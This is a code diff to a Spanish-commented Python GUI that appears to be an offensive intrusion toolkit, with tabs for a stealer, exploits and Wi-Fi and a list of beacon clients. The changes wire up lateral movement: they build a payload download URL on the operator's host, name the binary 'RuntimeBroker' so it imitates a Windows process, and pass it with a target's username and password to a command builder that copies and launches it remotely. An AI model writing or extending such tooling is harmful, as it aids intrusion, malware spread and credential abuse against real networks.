@@ -1037,6 +1037,8 @@ class MainWindow(QMainWindow):
         split.setSizes([430, 930])
         root.addWidget(split, 1)
 
+        self._beacon_refrescar()     # deja lista la lista de clientes (aún vacía)
+
     def _ir_tab(self, widget):
         """Va a la pestaña de `widget` sin depender de indices fijos (al meter
         la pestaña Wi-Fi los indices de Stealer y Exploits se desplazan)."""
@@ -2278,9 +2280,15 @@ class MainWindow(QMainWindow):
         self._lateral_autourl()
         url = self.in_lat_url.text().strip()
         tecnica = self.cb_lat_tecnica.currentText()
+        # El binario debe casar EXACTAMENTE con el nombre de la URL.
+        exe = (self.in_bnombre.text().strip() or "RuntimeBroker")
+        if os.name != "nt":
+            exe += ""            # en Linux/macOS el binario va sin extensión
+        else:
+            exe += ".exe"
         try:
             cmd = lateral.comando_completo(
-                tecnica, target, url,
+                tecnica, target, url, exe=exe,
                 usuario=self.in_lat_user.text().strip(),
                 password=self.in_lat_pass.text())
         except Exception as e:
@@ -2372,8 +2380,11 @@ class MainWindow(QMainWindow):
     def _lateral_autourl(self):
         host = self.in_bhost.text().strip() or escaner.ip_local()
         puerto = self.in_bhttp.text().strip() or "8080"
-        nombre = self.in_bnombre.text().strip() or "RuntimeBroker"
-        exe = nombre + (".exe" if os.name == "nt" else "")
+        exe = (self.in_bnombre.text().strip() or "RuntimeBroker")
+        if os.name != "nt":
+            exe += ""            # en Linux/macOS el binario va sin extensión
+        else:
+            exe += ".exe"
         self.in_lat_url.setText(f"http://{host}:{puerto}/{exe}")
 
     def _lateral_jump(self):
@@ -2387,9 +2398,15 @@ class MainWindow(QMainWindow):
             QMessageBox.information(self, "Lateral", "Faltan host destino o URL del payload.")
             return
         tecnica = self.cb_lat_tecnica.currentText()
+        # Mismo binario que la URL (si no, copia/arranca un nombre que no existe).
+        exe = (self.in_bnombre.text().strip() or "RuntimeBroker")
+        if os.name != "nt":
+            exe += ""            # en Linux/macOS el binario va sin extensión
+        else:
+            exe += ".exe"
         try:
             cmd = lateral.comando_completo(
-                tecnica, target, url,
+                tecnica, target, url, exe=exe,
                 usuario=self.in_lat_user.text().strip(),
                 password=self.in_lat_pass.text())
         except Exception as e:
